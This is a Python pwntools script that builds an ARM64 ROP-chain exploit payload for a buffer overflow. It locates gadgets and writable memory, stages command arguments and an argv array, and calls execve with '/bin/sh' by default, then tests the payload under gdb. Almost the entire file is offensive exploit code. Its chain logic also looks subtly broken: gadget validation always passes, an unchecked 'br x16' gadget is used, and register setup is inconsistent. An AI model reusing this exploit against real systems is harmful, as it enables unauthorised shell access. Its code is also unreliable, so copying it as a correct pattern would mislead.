from pwn import *
from find_gadgets import locate_gadgets
from writable_memory_finder import analyze_binary

def validate_gadgets(gadgets, required_gadgets):
    """
    Validates that all required gadgets are present in the extracted gadgets.
    """
    missing_gadgets = [g for g in required_gadgets if g not in gadgets]
    if missing_gadgets:
        log.warning(f"Missing gadgets: {missing_gadgets}. Attempting fallback mechanisms.")
    return True

def validate_writable_memory(writable_addr):
    """
    Validates that the writable memory address is suitable for exploitation.
    """
    if not writable_addr or b'\x00' in p64(writable_addr):
        log.error(f"Invalid writable memory address: {hex(writable_addr) if writable_addr else None}")
        return False
    return True

def select_writable_section(writable_sections, stack_pointer):
    """
    Select a suitable writable memory section for exploitation.
    Prioritizes .bss and .data sections without null bytes in their addresses.
    """
    preferred_sections = [".bss", ".data"]
    for section in writable_sections:
        if section["name"] in preferred_sections:
            addr_bytes = p64(section["start"])
            if b'\x00' not in addr_bytes:
                return section["start"]

    # Fallback to any writable section without null bytes in address
    for section in writable_sections:
        addr_bytes = p64(section["start"])
        if b'\x00' not in addr_bytes:
            return section["start"]

    # Use the stack pointer if it doesn't contain null bytes
    if stack_pointer and b'\x00' not in p64(stack_pointer):
        return stack_pointer

    return None

def construct_payload(offset, writable_addr, libc, cmd_args, gadgets):
    """
    Constructs a robust payload for exploiting an ARM64 binary.
    Adjusts for missing gadgets by using available alternatives.
    """
    # Required gadgets for payload construction
    required_gadgets = [
        "ldp x0, x1; ret",
        "str x1, [x0]; ret",
        "ldr x0, [sp], #8 ; ret"
    ]

    log.info("Validating extracted gadgets...")
    validate_gadgets(gadgets, required_gadgets)

    log.info("Validating writable memory...")
    if not validate_writable_memory(writable_addr):
        return None

    # Start payload with padding to reach return address
    payload = b"A" * offset

    # Prepare the command-line arguments
    cmd_strings = [arg.encode() + b"\x00" for arg in cmd_args]
    cmd_lengths = [len(s) for s in cmd_strings]
    arg_addresses = [writable_addr + sum(cmd_lengths[:i]) for i in range(len(cmd_lengths))]

    # Check for null bytes in writable memory addresses
    for addr in arg_addresses:
        if b'\x00' in p64(addr):
            log.error(f"Null bytes detected in writable memory address: {hex(addr)}")
            return None

    # Write command-line arguments to writable memory
    log.info("Constructing payload to write arguments to writable memory...")
    for arg, addr in zip(cmd_strings, arg_addresses):
        for i in range(0, len(arg), 8):  # Write chunks of 8 bytes
            chunk = arg[i:i + 8].ljust(8, b"\x00")  # Pad to 8 bytes
            payload += flat([
                gadgets["ldp x0, x1; ret"], addr + i, u64(chunk),
                gadgets["str x1, [x0]; ret"]
            ])

    # Construct argv array in memory
    argv_array_addr = writable_addr + sum(cmd_lengths) + 0x100  # Offset for argv array
    for addr in arg_addresses:
        payload += flat([
            gadgets["ldp x0, x1; ret"], argv_array_addr, addr,
            gadgets["str x1, [x0]; ret"]
        ])
        argv_array_addr += 8

    # Null-terminate argv array
    payload += flat([
        gadgets["ldp x0, x1; ret"], argv_array_addr, 0,
        gadgets["str x1, [x0]; ret"]
    ])

    # Set up registers and call execve
    log.info("Adding final ROP chain to trigger execve...")
    payload += flat([
        gadgets["ldp x0, x1; ret"], arg_addresses[0], argv_array_addr - 8,
        gadgets["ldr x0, [sp], #8 ; ret"], libc.symbols["execve"],
        gadgets["br x16 ; ret"]  # Fallback gadget to branch to system call
    ])

    log.success("Payload constructed successfully.")
    return payload

def test_payload(binary_path, payload):
    """
    Tests the generated payload against the target binary.
    """
    payload_path = "payload.bin"
    with open(payload_path, "wb") as f:
        f.write(payload)

    log.info(f"Testing payload against binary {binary_path}...")
    gdb_command = [
        "gdb", "--batch",
        "--ex", f"run {payload_path}",
        "--ex", "info registers"
    ]
    try:
        gdb_output = subprocess.run(gdb_command, stdout=subprocess.PIPE, text=True).stdout
        log.info(f"GDB Output:\n{gdb_output}")
    except Exception as e:
        log.error(f"Payload testing failed: {e}")

def main(binary_path, command):
    libc = ELF("/lib/aarch64-linux-gnu/libc.so.6")
    log.info("Analyzing binary for writable memory...")
    analysis = analyze_binary(binary_path)

    writable_addr = select_writable_section(analysis["writable_sections"], analysis["stack_pointer"])

    if not writable_addr:
        log.error("Failed to identify a suitable writable memory address without null bytes.")
        return

    log.info(f"Using writable memory address: {hex(writable_addr)}")

    log.info("Locating gadgets...")
    gadgets = locate_gadgets(binary_path)

    log.info("Constructing payload...")
    offset = 64  # Example buffer overflow offset
    payload = construct_payload(offset, writable_addr, libc, [command], gadgets)

    if payload:
        log.success("Payload generated successfully!")
        with open("exploit_payload", "wb") as f:
            f.write(payload)
        log.success("Payload saved to 'exploit_payload'.")
        test_payload(binary_path, payload)
    else:
        log.error("Payload generation failed.")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 payload_constructor.py <binary_path> <command>")
        sys.exit(1)

    binary_path = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "/bin/sh"
    main(binary_path, command)
